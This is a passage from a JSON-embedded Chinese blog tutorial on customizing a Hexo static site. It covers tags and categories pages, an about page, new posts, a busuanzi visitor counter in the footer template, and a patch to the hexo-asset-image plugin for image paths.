tags</span><br></pre></td></tr></table></figure>\n<p><img src=\"h1edlshktmHLnU9E-Xc1KebtW5e99chfzA5x7te3wSk.png\" alt=\"image\"></p>\n<p>根据上面的路径，找到index.md这个文件</p>\n<p>添加type: “tags” layout: “tags”到内容中，添加后是这样的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: tags</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 21:30:23</span><br><span class=\"line\"><span class=\"built_in\">type</span>: <span class=\"string\">&quot;tags&quot;</span></span><br><span class=\"line\">layout: <span class=\"string\">&quot;tags&quot;</span></span><br><span class=\"line\">---</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"标签页实现标签云效果\"><a href=\"#标签页实现标签云效果\" class=\"headerlink\" title=\"标签页实现标签云效果\"></a>标签页实现标签云效果</h3><p>安装插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-tag-cloud  --save</span><br></pre></td></tr></table></figure>\n<p>找到 tagcloud.ejs 文件，完整路径：</p>\n<p>修改为以下内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"文章添加标签\"><a href=\"#文章添加标签\" class=\"headerlink\" title=\"文章添加标签\"></a>文章添加标签</h3><p>在每篇文章的头部添加</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">title: Tags and Categories</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2017-12-24 23:29:53</span><br><span class=\"line\">tags:</span><br><span class=\"line\">- Foo</span><br><span class=\"line\">- Bar</span><br></pre></td></tr></table></figure>\n<p><img src=\"RXQ6UuEFKLy3acWISocGXpbos58iF4Oyf40e6MiOpm0.png\" alt=\"image\"></p>\n<h2 id=\"新分类页\"><a href=\"#新分类页\" class=\"headerlink\" title=\"新分类页\"></a>新分类页</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page categories</span><br></pre></td></tr></table></figure>\n<p>添加下面内容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: categories</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 23:32:13</span><br><span class=\"line\"><span class=\"built_in\">type</span>: <span class=\"string\">&quot;categories&quot;</span></span><br><span class=\"line\">comments: <span class=\"literal\">false</span></span><br><span class=\"line\">---</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>type</strong> 字段用来指定页面类型，<strong>comments</strong> 字段用来指定该页面是否显示评论。</p>\n<p>主题文件的_config.yml的nav添加个导航栏</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">category: /categories/</span><br></pre></td></tr></table></figure>\n<p>striptags：将html原文本缩略，并删除所有标记。</p>\n<p>先新建一个导航栏标签；在主题模板文件的_config.yml文件中设置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nav:</span><br><span class=\"line\">  home: /</span><br><span class=\"line\">  about: /about/</span><br></pre></td></tr></table></figure>\n<h2 id=\"创建about页面\"><a href=\"#创建about页面\" class=\"headerlink\" title=\"创建about页面\"></a>创建about页面</h2><p>新建一个about的页面</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page about</span><br></pre></td></tr></table></figure>\n<p>添加一些内容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: about</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 21:49:29</span><br><span class=\"line\"><span class=\"built_in\">type</span>: about</span><br><span class=\"line\">---</span><br><span class=\"line\"><span class=\"comment\">### 单体应用存在的问题</span></span><br><span class=\"line\"></span><br><span class=\"line\">- 随着业务的发展，开发变得越来越复杂。</span><br><span class=\"line\">- 修改、新增某个功能，需要对整个系统进行测试、重新部署。</span><br></pre></td></tr></table></figure>\n<p><img src=\"OMQaMoHEHKbp9hWjVkGDr_ImQo-eqhnO_1Kz8eCaoio.png\" alt=\"image\"></p>\n<h2 id=\"新建文章\"><a href=\"#新建文章\" class=\"headerlink\" title=\"新建文章\"></a>新建文章</h2><p>方法1：</p>\n<p>定位到我们项目的根目</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new <span class=\"string\">&#x27;my-first-blog&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>hexo会帮我们在“项目\\source\\_posts”下生成相关.md文件</p>\n<p><img src=\"I6B9MllFXPDmu5BESAms0VYvcirUV-Wp8QyPlquzN6U.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: my-first-blog</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 21:40:49</span><br><span class=\"line\">tags:</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<p>方法2：</p>\n<p>直接自己打开“项目\\source\\_posts”新建.md文件</p>\n<p>在书写的文章头添加上日期即可</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">title: Tags and Categories</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2017-12-24 23:29:53</span><br><span class=\"line\">tags:</span><br><span class=\"line\">- Foo</span><br><span class=\"line\">- Bar</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"BSXKfFqVvy9gbD0QiMuzv7Pr0zlOFyqPeRa51pvli0Y.png\" alt=\"image\"></p>\n<h2 id=\"博客访问量统计\"><a href=\"#博客访问量统计\" class=\"headerlink\" title=\"博客访问量统计\"></a>博客访问量统计</h2><p>进入.&#x2F;themes&#x2F;hexo-theme-cactus&#x2F;_config.yml添加下面一段代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 是否开启访问量统计功能(不蒜子)</span></span><br><span class=\"line\">busuanzi:</span><br><span class=\"line\"> <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>进入.&#x2F;themes&#x2F;hexo-theme-cactus&#x2F;layout&#x2F;_partial&#x2F;footer.ejs将添加下面内容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;footer <span class=\"built_in\">id</span>=<span class=\"string\">&quot;footer&quot;</span>&gt;</span><br><span class=\"line\">    &lt;div class=<span class=\"string\">&quot;footer-left&quot;</span>&gt;</span><br><span class=\"line\">        &lt;%= __(<span class=\"string\">&#x27;footer.copyright&#x27;</span>) %&gt; &amp;copy;</span><br><span class=\"line\">        &lt;% var endYear = (theme.copyright &amp;&amp; theme.copyright.end_year) ? theme.copyright.end_year : new Date().getFullYear() %&gt;</span><br><span class=\"line\">        &lt;% var startYear = (theme.copyright &amp;&amp; theme.copyright.start_year) ? theme.copyright.start_year : new Date().getFullYear() %&gt;</span><br><span class=\"line\">        &lt;%= startYear &gt;= endYear ? endYear : startYear + <span class=\"string\">&quot;-&quot;</span> + endYear %&gt;</span><br><span class=\"line\">        &lt;%= config.author || config.title %&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">    &lt;div class=<span class=\"string\">&quot;footer-right&quot;</span>&gt;</span><br><span class=\"line\">        &lt;nav&gt;</span><br><span class=\"line\">            &lt;ul&gt;</span><br><span class=\"line\">                &lt;% <span class=\"keyword\">for</span> (var i <span class=\"keyword\">in</span> theme.nav) &#123; %&gt;&lt;!--</span><br><span class=\"line\">       --&gt;&lt;li&gt;&lt;a href=<span class=\"string\">&quot;&lt;%- url_for(theme.nav[i]) %&gt;&quot;</span>&gt;&lt;%= __(<span class=\"string\">&#x27;nav.&#x27;</span>+i).replace(<span class=\"string\">&quot;nav.&quot;</span>, <span class=\"string\">&quot;&quot;</span>) %&gt;&lt;/a&gt;&lt;/li&gt;&lt;!--</span><br><span class=\"line\">     --&gt;&lt;% &#125; %&gt;</span><br><span class=\"line\">            &lt;/ul&gt;</span><br><span class=\"line\">            &lt;ul&gt;</span><br><span class=\"line\">                &lt;% <span class=\"keyword\">if</span> (theme.busuanzi &amp;&amp; theme.busuanzi.enable)&#123; %&gt;</span><br><span class=\"line\">                    &lt;!-- 不蒜子统计 --&gt;</span><br><span class=\"line\">                    &lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_pv&quot;</span>&gt;</span><br><span class=\"line\">                  本站总访问量&lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_pv&quot;</span>&gt;&lt;/span&gt;次</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">                    &lt;span class=<span class=\"string\">&quot;post-meta-divider&quot;</span>&gt;|&lt;/span&gt;</span><br><span class=\"line\">                    &lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_uv&quot;</span> style=<span class=\"string\">&#x27;display:none&#x27;</span>&gt;</span><br><span class=\"line\">                      本站访客数&lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_uv&quot;</span>&gt;&lt;/span&gt;人</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">                    &lt;script async src=<span class=\"string\">&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">                &lt;% &#125; %&gt;</span><br><span class=\"line\">            &lt;/ul&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;/nav&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/footer&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"poHJNJtonbsgvvQIBG8E41KtD96hIIGt4BJFaA_zc_4.png\" alt=\"image\"></p>\n<p><img src=\"PsVIGJRySYSQSslwM2YnUpiuRKCqnZ1W7Ly_0xeAZLA.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;ul&gt;</span><br><span class=\"line\">                &lt;% <span class=\"keyword\">if</span> (theme.busuanzi &amp;&amp; theme.busuanzi.enable)&#123; %&gt;</span><br><span class=\"line\">                    &lt;!-- 不蒜子统计 --&gt;</span><br><span class=\"line\">                    &lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_pv&quot;</span>&gt;</span><br><span class=\"line\">                  本站总访问量&lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_pv&quot;</span>&gt;&lt;/span&gt;次</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">                    &lt;script async src=<span class=\"string\">&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">                &lt;% &#125; %&gt;</span><br><span class=\"line\">            &lt;/ul&gt;</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"文章添加图片\"><a href=\"#文章添加图片\" class=\"headerlink\" title=\"文章添加图片\"></a>文章添加图片</h2><h3 id=\"安装插件\"><a href=\"#安装插件\" class=\"headerlink\" title=\"安装插件\"></a>安装插件</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>\n<h3 id=\"修改-config-yml\"><a href=\"#修改-config-yml\" class=\"headerlink\" title=\"修改_config.yml\"></a>修改_config.yml</h3><p>打开hexo的配置文件_config.yml；找到 post_asset_folder，把这个选项从false改成true</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#加载图片用到</span></span><br><span class=\"line\">post_asset_folder: <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"修改index-js\"><a href=\"#修改index-js\" class=\"headerlink\" title=\"修改index.js\"></a>修改index.js</h3><p>文件：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">/node_modules/hexo-asset-image/index.js</span><br></pre></td></tr></table></figure>\n<p>修改内容1：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">58</span>行</span><br><span class=\"line\">$(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>, config.<span class=\"property\">root</span> + link + src);</span><br><span class=\"line\">修改为：</span><br><span class=\"line\">$(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>,src);</span><br></pre></td></tr></table></figure>\n<p>修改内容2：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">45</span>行</span><br><span class=\"line\">|| <span class=\"regexp\">/^\\s*\\/uploads|images\\//</span>.<span class=\"title function_\">test</span>(src))) &#123;</span><br><span class=\"line\">修改为：</span><br><span class=\"line\">|| <span class=\"regexp\">/^\\s*\\/uploads|images1\\//</span>.<span class=\"title function_\">test</span>(src))) &#123;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最终代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&#x27;use strict&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> cheerio = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;cheerio&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">getPosition</span>(<span class=\"params\">str, m, i</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> str.<span class=\"title function_\">split</span>(m, i).<span class=\"title function_\">join</span>(m).<span class=\"property\">length</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">hexo.<span class=\"property\">extend</span>.<span class=\"property\">filter</span>.<span class=\"title function_\">register</span>(<span class=\"string\">&#x27;after_post_render&#x27;</span>, <span class=\"keyword\">function</span>(<span class=\"params\">data</span>)&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> config = hexo.<span class=\"property\">config</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(config.<span class=\"property\">post_asset_folder</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> link = data.<span class=\"property\">permalink</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> beginPos = <span class=\"title function_\">getPosition</span>(link, <span class=\"string\">&#x27;/&#x27;</span>, <span class=\"number\">3</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> appendLink = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"comment\">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class=\"line\">    <span class=\"comment\">// if not with index.html endpos = link.lastIndexOf(&#x27;.&#x27;) + 1 support hexo-abbrlink</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"regexp\">/.*\\/index\\.html$/</span>.<span class=\"title function_\">test</span>(link)) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// when permalink is end with index.html, for example 2019/02/20/xxtitle/index.html</span></span><br><span class=\"line\">      <span class=\"comment\">// image in xxtitle/ will go to xxtitle/index/</span></span><br><span class=\"line\">      appendLink = <span class=\"string\">&#x27;index/&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> endPos = link.<span class=\"title function_\">lastIndexOf</span>(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> endPos = link.<span class=\"title function_\">lastIndexOf</span>(<span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    link = link.<span class=\"title function_\">substring</span>(beginPos, endPos) + <span class=\"string\">&#x27;/&#x27;</span> + appendLink;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> toprocess = [<span class=\"string\">&#x27;excerpt&#x27;</span>, <span class=\"string\">&#x27;more&#x27;</span>, <span class=\"string\">&#x27;content&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; toprocess.<span class=\"property\">length</span>; i++)&#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> key = toprocess[i];</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">var</span> $ = cheerio.<span class=\"title function_\">load</span>(data[key], &#123;</span><br><span class=\"line\">        <span class=\"attr\">ignoreWhitespace</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">xmlMode</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">lowerCaseTags</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">decodeEntities</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">      $(<span class=\"string\">&#x27;img&#x27;</span>).<span class=\"title function_\">each</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>))&#123;</span><br><span class=\"line\">          <span class=\"comment\">// For windows style path, we replace &#x27;\\&#x27; to &#x27;/&#x27;.</span></span><br><span class=\"line\">          <span class=\"keyword\">var</span> src = $(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>).<span class=\"title function_\">replace</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span>(!(<span class=\"regexp\">/http[s]*.*|\\/\\/.*/</span>.<span class=\"title function_\">test</span>(src)</span><br><span class=\"line\">            || <span class=\"regexp\">/^\\s+\\//</span>.<span class=\"title function_\">test</span>(src)</span><br><span class=\"line\">            || <span class=\"regexp\">/^\\s*\\/uploads|images1\\//</span>.<span class=\"title function_\">test</span>(src))) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class=\"line\">            <span class=\"comment\">// In addition, to support multi-level local directory.</span></span><br><span class=\"line\">            <span class=\"keyword\">var</span> linkArray = link.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;/&#x27;</span>).<span class=\"title function_\">filter</span>(<span class=\"keyword\">function</span>(<span class=\"params\">elem</span>)&#123;</span><br><span class=\"line\">              <span class=\"keyword\">return</span> elem != <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            <span class=\"keyword\">var</span> srcArray = src.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;/&#x27;</span>).<span class=\"title function_\">filter</span>(<span class=\"keyword\">function</span>(<span class=\"params\">elem</span>)&#123;</span><br><span class=\"line\">              <span class=\"keyword\">return</span> elem != <span class=\"string\">&#x27;&#x27;</span> &amp;&amp; elem != <span class=\"string\">&#x27;.&#x27;</span>;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(srcArray.<span class=\"property\">length</span> &gt; <span class=\"number\">1</span>)</span><br><span class=\"line\">            srcArray.<span class=\"title function_\">shift</span>();</span><br><span class=\"line\">            src = srcArray.<span class=\"title function_\">join</span>(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//$(this).attr(&#x27;src&#x27;, config.root + link + src);</span></span><br><span class=\"line\">            $(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>, src);</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"string\">&quot;src：&quot;</span> + src);<span class=\"comment\">//src：Fp7aKq--0PJJ6yD8kdJ6bU6csSL8UPnWsCQKPjaGIv0.png</span></span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"property\">info</span>&amp;&amp;<span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"string\">&quot;update link as:--&gt;&quot;</span>+config.<span class=\"property\">root</span> + link + src);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">          <span class=\"variable language_\">console</span>.<span class=\"property\">info</span>&amp;&amp;<span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"string\">&quot;no src attr, skipped...&quot;</span>);</span><br><span class=\"line\">          <span class=\"variable language_\">console</span>.<span class=\"property\">info</span>&amp;&amp;<span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>($(<span class=\"variable language_\">this</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      data[key] = $.<span class=\"title function_\">html</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","categories":["Hexo"],"tags":["Hexo"]}]